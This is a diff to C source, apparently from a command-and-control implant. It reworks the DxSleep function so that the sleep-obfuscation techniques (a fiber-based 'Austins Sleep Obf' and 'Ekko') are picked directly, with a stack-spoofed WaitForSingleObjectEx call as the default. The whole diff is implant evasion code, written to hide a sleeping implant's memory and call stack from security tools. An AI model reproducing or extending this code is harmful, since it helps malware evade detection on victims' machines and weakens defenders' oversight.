@@ -469,43 +469,43 @@ VOID EkkoObf( DWORD TimeOut )
 
 VOID DxSleep( UINT32 TimeOut )
 {
-    if ( Instance->Config.Implant.SleepMask )
+    DWORD Technique = Instance->Config.Implant.SleepMaskTechnique;
+
+    if ( Instance->Threads )
     {
-        DWORD Technique = Instance->Config.Implant.SleepMaskTechnique;
-
-        if ( Instance->Threads )
-        {
-            PRINTF( "Can't sleep obf. Threads running: %d\n", Instance->Threads )
-            Technique = 0;
-        }
-
-        switch ( Technique )
-        {
-            case 1: // Austins Sleep Obf
-            {
-                SLEEP_PARAM Param = { 0 };
-
-                if ( ( Param.Master = Instance->Win32.ConvertThreadToFiberEx( &Param, NULL ) ) )
-                {
-                    if ( ( Param.Slave = Instance->Win32.CreateFiberEx( 0x1000 * 6, NULL, NULL, FoliageObf, &Param ) ) )
-                    {
-                        Param.TimeOut = TimeOut;
-                        Instance->Win32.SwitchToFiber( Param.Slave );
-                        Instance->Win32.DeleteFiber( Param.Slave );
-                    }
-                    Instance->Win32.ConvertFiberToThread( );
-                }
-                break;
-            }
-
-            case 2: // Ekko
-            {
-                EkkoObf( TimeOut );
-                break;
-            }
-        }
+        PRINTF( "Can't sleep obf. Threads running: %d\n", Instance->Threads )
+        Technique = 0;
     }
 
-    SpoofFunc( Instance->Win32.WaitForSingleObjectEx, Instance->Modules.KernelBase, IMAGE_SIZE( Instance->Modules.KernelBase ), NtCurrentProcess(), TimeOut, FALSE );
+    switch ( Technique )
+    {
+        case 1: // Austins Sleep Obf
+        {
+            SLEEP_PARAM Param = { 0 };
+
+            if ( ( Param.Master = Instance->Win32.ConvertThreadToFiberEx( &Param, NULL ) ) )
+            {
+                if ( ( Param.Slave = Instance->Win32.CreateFiberEx( 0x1000 * 6, NULL, NULL, FoliageObf, &Param ) ) )
+                {
+                    Param.TimeOut = TimeOut;
+                    Instance->Win32.SwitchToFiber( Param.Slave );
+                    Instance->Win32.DeleteFiber( Param.Slave );
+                }
+                Instance->Win32.ConvertFiberToThread( );
+            }
+            break;
+        }
+
+        case 2: // Ekko
+        {
+            EkkoObf( TimeOut );
+            break;
+        }
+
+        default:
+        {
+            SpoofFunc( Instance->Win32.WaitForSingleObjectEx, Instance->Modules.KernelBase, IMAGE_SIZE( Instance->Modules.KernelBase ), NtCurrentProcess(), TimeOut, FALSE );
+        }
+    }
 
 }
